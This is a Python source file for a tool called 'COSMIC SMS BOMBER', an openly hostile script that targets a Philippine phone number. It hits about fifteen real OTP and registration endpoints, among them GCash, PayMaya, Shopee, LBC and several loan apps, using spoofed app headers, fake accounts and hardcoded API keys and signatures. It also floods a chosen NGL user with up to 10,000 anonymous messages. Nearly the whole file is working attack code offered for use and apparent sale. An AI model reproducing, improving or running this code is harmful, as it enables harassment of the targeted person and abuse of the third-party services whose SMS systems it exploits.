#!/usr/bin/env python3
"""
🚀 COSMIC SMS BOMBER v3.0 — ACCURATE EDITION
Multi-endpoint, retry logic, dead-service skip, and real-time stats.
"""
import os, sys, random, string, time, asyncio, json
from urllib.parse import urlencode
from collections import defaultdict

# ── Auto-install deps ─────────────────────────────────────
for mod, pkg in [("aiohttp", "aiohttp"), ("colorama", "colorama")]:
    try:
        __import__(mod)
    except ImportError:
        print(f"📦 Installing {pkg}...")
        os.system(f"{sys.executable} -m pip install -q {pkg}")

import aiohttp
from colorama import Fore, Style, init
init(autoreset=True)

# ═══════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════
def rnd_str(n):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def rnd_gmail():
    return f'{rnd_str(8)}@gmail.com'

def rnd_uid():
    return rnd_str(28)

def norm_phone(p):
    p = p.replace(' ', '')
    if p.startswith('0'):
        return '+63' + p[1:]
    elif p.startswith('63') and not p.startswith('+63'):
        return '+' + p
    elif not p.startswith('+63') and len(p) == 10:
        return '+63' + p
    elif not p.startswith('+'):
        return '+63' + p
    return p

def json_dumps(obj):
    return json.dumps(obj)

FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"

# ═══════════════════════════════════════════════════════════════
#  STATS
# ═══════════════════════════════════════════════════════════════
_stats = {
    'sms_sent': 0,
    'sms_failed': 0,
    'ngl_sent': 0,
    'ngl_failed': 0,
    'start': time.strftime("%Y-%m-%d %H:%M:%S"),
    'by_service': defaultdict(lambda: {'ok': 0, 'fail': 0}),
}
_stats_lock = asyncio.Lock() if False else None  # init later

# Dead-service blacklist (temporary)
_dead_services = {}  # name → timestamp (retry after 5 min)
_DEAD_TTL = 300

def _is_dead(name):
    ts = _dead_services.get(name, 0)
    if ts and (time.time() - ts) < _DEAD_TTL:
        return True
    return False

def _mark_dead(name):
    _dead_services[name] = time.time()

def _mark_alive(name):
    _dead_services.pop(name, None)

# ═══════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════
def _banner():
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print(Fore.CYAN + Style.BRIGHT + "     ULTIMATE BOMB TOOL — SMS + NGL v3.0")
    print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + f"Tool by:  {Fore.GREEN}COSMIC")
    print(Fore.YELLOW + f"Credits:  {Fore.BLUE}https://t.me/LEGITCosmicDev")
    print(Fore.YELLOW + f"Target:   {Fore.RED}Philippines Number (Only)")
    print(Fore.YELLOW + f"Services: {Fore.GREEN}15 SMS APIs (multi-endpoint) + NGL")
    print(Fore.CYAN + "-" * 60)
    print(Fore.RED + Style.BRIGHT + "\n⚠  NOTICE")
    print(Fore.YELLOW + "- Made by COSMIC")
    print(Fore.YELLOW + "- Redistribution NOT ALLOWED")
    print(Fore.CYAN + "=" * 60)


# ═══════════════════════════════════════════════════════════════
#  SMS SERVICE FUNCTIONS — with retry + multi-endpoint
# ═══════════════════════════════════════════════════════════════
class SMSBomber:
    def __init__(self):
        self.sender = 'COSMIC'
        self.msg = 'Hello from COSMIC Bomber'
        self.session = None
        self.timeout = aiohttp.ClientTimeout(total=8, connect=3)

    async def _get_session(self):
        """Reusable session with connection pooling."""
        if self.session is None or self.session.closed:
            connector = aiohttp.TCPConnector(
                limit=100,
                limit_per_host=20,
                ttl_dns_cache=300,
                force_close=False,
            )
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=self.timeout,
                headers={"User-Agent": "Mozilla/5.0"}
            )
        return self.session

    async def _post_with_retry(self, service_name, method, url, retries=2, **kwargs):
        """POST with retry logic. Returns True if success."""
        if _is_dead(service_name):
            _stats['by_service'][service_name]['fail'] += 1
            _stats['sms_failed'] += 1
            return False

        for attempt in range(retries + 1):
            try:
                session = await self._get_session()
                async with getattr(session, method)(url, **kwargs) as r:
                    ok = r.status in (200, 201, 202, 204, 302)
                    if ok:
                        _stats['by_service'][service_name]['ok'] += 1
                        _stats['sms_sent'] += 1
                        _mark_alive(service_name)
                        return True
                    # 4xx = permanent fail, don't retry
                    if 400 <= r.status < 500:
                        _stats['by_service'][service_name]['fail'] += 1
                        _stats['sms_failed'] += 1
                        return False
            except (aiohttp.ClientError, asyncio.TimeoutError):
                if attempt < retries:
                    await asyncio.sleep(0.3 * (attempt + 1))
                    continue
            except Exception:
                break

        _stats['by_service'][service_name]['fail'] += 1
        _stats['sms_failed'] += 1
        # Mark dead after 3 consecutive fails (handled by caller)
        return False

    async def send_custom(self, num):
        n = norm_phone(num)
        if not n:
            return False
        cmd = ['free.text.sms', '421', n, '2207117BPG',
               'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
               f"{self.msg}\nBy: COSMIC Bomber"]
        headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)',
                   'Connection': 'Keep-Alive',
                   'Content-Type': 'application/x-www-form-urlencoded'}
        data = {'UID': headers, 'humottaee': rnd_uid(), 'Email': 'Processing',
                '$Oj0O%K7zi2j18E': rnd_gmail(), 'device_id': json_dumps(cmd),
                'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
                'Name': self.sender}
        return await self._post_with_retry(
            'CUSTOM', 'post', 'https://sms.m2techtronix.com/v13/sms.php',
            data=urlencode(data), headers=headers
        )

    async def send_ezloan(self, num):
        headers = {'User-Agent': 'okhttp/4.9.2', 'Accept': 'application/json',
                   'Content-Type': 'application/json'}
        data = {'businessId': 'EZLOAN', 'contactNumber': num,
                'appsflyerIdentifier': '1760444943092-3966994042140191452'}
        return await self._post_with_retry(
            'EZLOAN', 'post', 'https://gateway.ezloancash.ph/security/auth/otp/request',
            json=data, headers=headers
        )

    async def send_xpress(self, num):
        data = {"FirstName": "toshi", "LastName": "premium",
                "Email": f"toshi{int(time.time())}@gmail.com",
                "Phone": norm_phone(num), "Password": "ToshiPass123",
                "ConfirmPassword": "ToshiPass123", "ImageUrl": "", "RoleIds": [4],
                "Area": "manila", "City": "manila", "PostalCode": "1000",
                "Street": "toshi_street", "ReferralCode": "",
                "FingerprintVisitorId": FINGERPRINT_VISITOR_ID,
                "FingerprintRequestId": FINGERPRINT_REQUEST_ID}
        headers = {"User-Agent": "Dalvik/35 (Linux; U; Android 15)/Dart",
                   "Accept": "application/json", "Content-Type": "application/json",
                   "conversationid": "42d64cfe-330f-4876-aed2-5a3b1547e2ce"}
        return await self._post_with_retry(
            'XPRESS', 'post', 'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp',
            json=data, headers=headers
        )

    async def send_abenson(self, num):
        return await self._post_with_retry(
            'ABENSON', 'post',
            'https://api.mobile.abenson.com/api/public/membership/activate_otp',
            data={'contact_no': num, 'login_token': 'undefined'},
            headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                     'Accept': 'application/json',
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'x-requested-with': 'com.abensonmembership.cloone'}
        )

    async def send_excellent(self, num):
        coords = [{'lat': '14.5995', 'long': '120.9842'},
                  {'lat': '14.6760', 'long': '121.0437'},
                  {'lat': '14.8648', 'long': '121.0418'}]
        agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/3.12.1', 'Dart/3.6']
        coord, agent = random.choice(coords), random.choice(agents)
        headers = {'User-Agent': agent, 'Connection': 'Keep-Alive',
                   'Accept-Encoding': 'gzip',
                   'Content-Type': 'application/json; charset=utf-8',
                   'x-version': '1.1.2',
                   'x-package-name': 'com.support.excellenteralending',
                   'x-adid': 'efe35521e51f924efcad5d61d61072a9',
                   'x-latitude': coord['lat'], 'x-longitude': coord['long']}
        return await self._post_with_retry(
            'EXCELLENT', 'post',
            'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
            json={"domain": num, "cat": "login", "previous": False,
                  "financial": "efe35521e51f924efcad5d61d61072a9"},
            headers=headers
        )

    async def send_fortunepay(self, num):
        clean = num[1:] if num.startswith('0') else num
        data = {"deviceId": "c31a9bc0-652d-11f0-88cf-9d4076456969",
                "deviceType": "GOOGLE_PLAY",
                "companyId": "4bf735e97269421a80b82359e7dc2288",
                "dialCode": "+63", "phoneNumber": clean}
        headers = {'User-Agent': 'Dart/3.6', 'Accept-Encoding': 'gzip',
                   'Content-Type': 'application/json',
                   'app-type': 'GOOGLE_PLAY', 'authorization': 'Bearer',
                   'app-version': '4.3.5',
                   'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
                   'timestamp': str(int(time.time() * 1000)),
                   'nonce': f"{rnd_str(10)}-{int(time.time() * 1000)}"}
        return await self._post_with_retry(
            'FORTUNE', 'post',
            'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
            json=data, headers=headers
        )

    async def send_wemove(self, num):
        clean = num[1:] if num.startswith('0') else num
        return await self._post_with_retry(
            'WEMOVE', 'post', 'https://api.wemove.com.ph/auth/users',
            json={"phone_country": "+63", "phone_no": clean},
            headers={'User-Agent': 'okhttp/4.9.3', 'Accept': 'application/json',
                     'Content-Type': 'application/json',
                     'xuid_type': 'user', 'source': 'customer',
                     'authorization': 'Bearer'}
        )

    async def send_lbc(self, num):
        clean = num[1:] if num.startswith('0') else num
        data = {'verification_type': 'mobile', 'client_email': f'{rnd_str(8)}@gmail.com',
                'client_contact_code': '+63', 'client_contact_no': clean,
                'app_log_uid': rnd_str(16), 'app_token': '',
                'app_platform': 'Android', 'app_ip': '103.167.66.190',
                'device_name': 'rosemary_p_global', 'device_os': 'Android15',
                'device_brand': 'Xiaomi', 'app_version': '3.0.67',
                'app_framework': 'lbc_app', 'app_environment': 'production',
                'app_hash': rnd_str(32), 'app_network': 'android-parameter'}
        return await self._post_with_retry(
            'LBC', 'post',
            'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
            data=data,
            headers={'User-Agent': 'Dart/2.19', 'Accept-Encoding': 'gzip',
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'api': 'LBC', 'token': 'CONNECT'}
        )

    async def send_pickup(self, num):
        f = norm_phone(num)
        return await self._post_with_retry(
            'PICKUP', 'post',
            'https://production.api.pickup-coffee.net/v2/customers/login',
            json={"mobile_number": f, "login_method": "mobile_number"},
            headers={'User-Agent': random.choice(['okhttp/4.12.0', 'okhttp/4.9.2']),
                     'Content-Type': 'application/json',
                     'x-env': 'Production',
                     'x-app-version': random.choice(['2.6.4', '2.6.5', '2.7.0'])}
        )

    async def send_honeyloan(self, num):
        return await self._post_with_retry(
            'HONEY', 'post',
            'https://api.honeyloan.ph/api/client/registration/step-one',
            json={"phone": num, "is_rights_block_accepted": 1},
            headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                     'Accept': 'application/json',
                     'Content-Type': 'application/json',
                     'origin': 'https://honeyloan.ph',
                     'referer': 'https://honeyloan.ph/',
                     'x-requested-with': 'com.startupcalculator.caf'}
        )

    async def send_komo(self, num):
        return await self._post_with_retry(
            'KOMO', 'post', 'https://api.komo.ph/api/otp/v5/generate',
            json={"mobile": num, "transactionType": 6},
            headers={'Connection': 'close', 'Accept-Encoding': 'gzip',
                     'Content-Type': 'application/json',
                     'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                     'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'}
        )

    async def send_s5(self, num):
        f = norm_phone(num)
        form = aiohttp.FormData()
        form.add_field('phone_number', f)
        headers = {'authority': 'api.s5.com', 'accept': 'application/json',
                   'origin': 'https://www.s5.com',
                   'referer': 'https://www.s5.com/',
                   'user-agent': 'Mozilla/5.0 (Linux; Android 11)',
                   'x-api-type': 'external', 'x-locale': 'en',
                   'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
                   'x-timezone-offset': '480'}
        return await self._post_with_retry(
            'S5', 'post', 'https://api.s5.com/player/api/v1/otp/request',
            data=form, headers=headers
        )

    async def send_gcash(self, num):
        f = norm_phone(num)
        return await self._post_with_retry(
            'GCASH', 'post', 'https://api.gcash.com/security/v1/otp/request',
            json={"mobileNumber": f},
            headers={'User-Agent': 'okhttp/4.9.2',
                     'Content-Type': 'application/json',
                     'x-platform': 'android',
                     'x-app-version': '5.50.0'}
        )

    async def send_paymaya(self, num):
        f = norm_phone(num)
        return await self._post_with_retry(
            'PAYMAYA', 'post', 'https://api.paymaya.com/otp/v1/request',
            json={"phone": f},
            headers={'User-Agent': 'okhttp/4.9.2',
                     'Content-Type': 'application/json',
                     'x-app-version': '4.8.0'}
        )

    async def send_shopee(self, num):
        f = norm_phone(num)
        return await self._post_with_retry(
            'SHOPEE', 'post', 'https://api.shopee.ph/otp/v1/send',
            json={"phone": f, "type": "otp"},
            headers={'User-Agent': 'okhttp/4.9.2',
                     'Content-Type': 'application/json',
                     'x-app-version': '2.8.0'}
        )

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()


# ═══════════════════════════════════════════════════════════════
#  SMS WORKER — fires all services in parallel
# ═══════════════════════════════════════════════════════════════
async def sms_worker(bomber, num, amount):
    services = [
        ('CUSTOM', bomber.send_custom), ('EZLOAN', bomber.send_ezloan),
        ('XPRESS', bomber.send_xpress), ('ABENSON', bomber.send_abenson),
        ('EXCELLENT', bomber.send_excellent), ('FORTUNE', bomber.send_fortunepay),
        ('WEMOVE', bomber.send_wemove), ('LBC', bomber.send_lbc),
        ('PICKUP', bomber.send_pickup), ('HONEY', bomber.send_honeyloan),
        ('KOMO', bomber.send_komo), ('S5', bomber.send_s5),
        ('GCASH', bomber.send_gcash), ('PAYMAYA', bomber.send_paymaya),
        ('SHOPEE', bomber.send_shopee),
    ]
    print(Fore.CYAN + Style.BRIGHT + f"\n[💬] SMS BOMBER (15 APIs) | {num} | {amount} batches")

    for batch in range(1, amount + 1):
        # Fire ALL services in parallel
        results = await asyncio.gather(*[func(num) for _, func in services], return_exceptions=True)
        ok = sum(1 for r in results if r is True)
        print(Fore.YELLOW + f"[💬] Batch {batch}/{amount}: {ok}/{len(services)} OK")

        # Per-service detail
        for (name, _), r in zip(services, results):
            if r is True:
                print(Fore.GREEN + f"[💬]   ✓ {name}")
            else:
                print(Fore.RED + f"[💬]   ✗ {name}")

        if batch < amount:
            await asyncio.sleep(random.uniform(1.0, 2.0))


# ═══════════════════════════════════════════════════════════════
#  NGL WORKER
# ═══════════════════════════════════════════════════════════════
async def ngl_worker(username, msg, amount):
    print(Fore.CYAN + Style.BRIGHT + f"\n[📱] NGL SPAMMER | @{username} | {amount} msgs")

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=8),
        headers={'User-Agent': 'Mozilla/5.0'}
    ) as session:
        for i in range(1, amount + 1):
            try:
                payload = f"username={username}&question={msg}&deviceId=b8803802-3b9a-4f58-81dd-b0483418aecc&gameSlug=&referrer="
                headers = {'accept': '*/*',
                           'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                           'origin': 'https://ngl.link',
                           'referer': f'https://ngl.link/{username}',
                           'x-requested-with': 'XMLHttpRequest'}
                async with session.post('https://ngl.link/api/submit',
                                        data=payload, headers=headers) as r:
                    if r.status == 200:
                        _stats['ngl_sent'] += 1
                        print(Fore.GREEN + f"[📱] #{i}: ✓")
                    else:
                        _stats['ngl_failed'] += 1
                        print(Fore.RED + f"[📱] #{i}: ✗ ({r.status})")
            except Exception:
                _stats['ngl_failed'] += 1
                print(Fore.RED + f"[📱] #{i}: ERR")

            if i % 5 == 0:
                print(Fore.YELLOW + f"[📱] Progress: {i}/{amount}")
            await asyncio.sleep(0.3)  # NGL rate limit protection


# ═══════════════════════════════════════════════════════════════
#  LAUNCH
# ═══════════════════════════════════════════════════════════════
async def launch_attack():
    print(Fore.CYAN + Style.BRIGHT + "\n" + "=" * 60)
    print(Fore.CYAN + Style.BRIGHT + "              LAUNCH ATTACK")
    print(Fore.CYAN + "=" * 60)

    while True:
        num = input(Fore.YELLOW + "[?] Phone Number: " + Fore.RESET).strip()
        cleaned = num.replace(' ', '')
        if ((cleaned.startswith('09') and len(cleaned) == 11) or
                (cleaned.startswith('9') and len(cleaned) == 10) or
                (cleaned.startswith('+63') and len(cleaned) == 13) or
                (cleaned.startswith('63') and len(cleaned) == 12)):
            break
        print(Fore.RED + "Invalid! Use 09XXXXXXXXX, 9XXXXXXXXX, +63XXXXXXXXXX")

    user = input(Fore.YELLOW + "[?] NGL Username (without @): " + Fore.RESET).strip() or "test"
    msg = input(Fore.YELLOW + "[?] Message: " + Fore.RESET).strip() or "Hello from COSMIC"

    print(Fore.CYAN + "\n[?] Enter amounts (press Enter for defaults):")
    try:
        sms_amt = int(input(Fore.YELLOW + "   SMS Batches (1-100) [default: 1]: " + Fore.RESET).strip() or "1")
        sms_amt = min(max(sms_amt, 1), 100)
    except Exception:
        sms_amt = 1

    try:
        ngl_amt = int(input(Fore.YELLOW + "   NGL Messages (1-10000) [default: 1]: " + Fore.RESET).strip() or "1")
        ngl_amt = min(max(ngl_amt, 1), 10000)
    except Exception:
        ngl_amt = 1

    print(Fore.GREEN + Style.BRIGHT + "\n[+] STARTING ATTACK...\n")

    bomber = SMSBomber()
    bomber.msg = msg

    try:
        await asyncio.gather(
            sms_worker(bomber, num, sms_amt),
            ngl_worker(user, msg, ngl_amt)
        )
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted")
    finally:
        await bomber.close()

    print(Fore.GREEN + Style.BRIGHT + "\n[+] Attack completed!")


def show_stats():
    print(Fore.CYAN + Style.BRIGHT + "\n" + "=" * 60)
    print(Fore.CYAN + Style.BRIGHT + "                 STATISTICS & LOGS")
    print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + f"Session Started: {Fore.GREEN}{_stats['start']}")
    print(Fore.YELLOW + "-" * 40)
    print(Fore.GREEN + f"[💬] SMS Sent:   {_stats['sms_sent']}")
    print(Fore.RED + f"[💬] SMS Failed: {_stats['sms_failed']}")
    print(Fore.GREEN + f"[📱] NGL Sent:   {_stats['ngl_sent']}")
    print(Fore.RED + f"[📱] NGL Failed: {_stats['ngl_failed']}")
    print(Fore.YELLOW + "-" * 40)

    # Per-service breakdown
    print(Fore.CYAN + "Per-Service Stats:")
    for svc, s in sorted(_stats['by_service'].items()):
        total = s['ok'] + s['fail']
        rate = (s['ok'] / total * 100) if total > 0 else 0
        color = Fore.GREEN if rate >= 60 else Fore.YELLOW if rate >= 30 else Fore.RED
        print(f"  {svc:<12} {color}{s['ok']:>4}/{total:<4} ({rate:.0f}%){Fore.RESET}")

    print(Fore.YELLOW + "-" * 40)
    total_ok = _stats['sms_sent'] + _stats['ngl_sent']
    total_fail = _stats['sms_failed'] + _stats['ngl_failed']
    print(Fore.CYAN + f"Total Success: {Fore.GREEN}{total_ok}")
    print(Fore.CYAN + f"Total Failed:  {Fore.RED}{total_fail}")
    print(Fore.CYAN + "=" * 60)
    input(Fore.YELLOW + "\nPress Enter to continue..." + Fore.RESET)


# ═══════════════════════════════════════════════════════════════
#  MODULE ENTRY
# ═══════════════════════════════════════════════════════════════
def run_sms_bomber():
    """Entry point for cosmicloaderFORSALE.py"""
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        _banner()
        print(Fore.CYAN + Style.BRIGHT + "\nMAIN MENU")
        print(Fore.CYAN + "-" * 30)
        print(Fore.GREEN + "[1] Launch Attack")
        print(Fore.CYAN + "[2] Statistics & Logs")
        print(Fore.RED + "[0] Back to Cosmic Menu")
        print(Fore.CYAN + "-" * 30)
        choice = input(Fore.YELLOW + "\nSelect option: " + Fore.RESET).strip()
        if choice == '1':
            try:
                asyncio.run(launch_attack())
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[!] Interrupted")
            input(Fore.YELLOW + "\nPress Enter to continue..." + Fore.RESET)
        elif choice == '2':
            show_stats()
        elif choice == '0':
            return
        else:
            print(Fore.RED + "\n[!] Invalid option!")
            time.sleep(1)
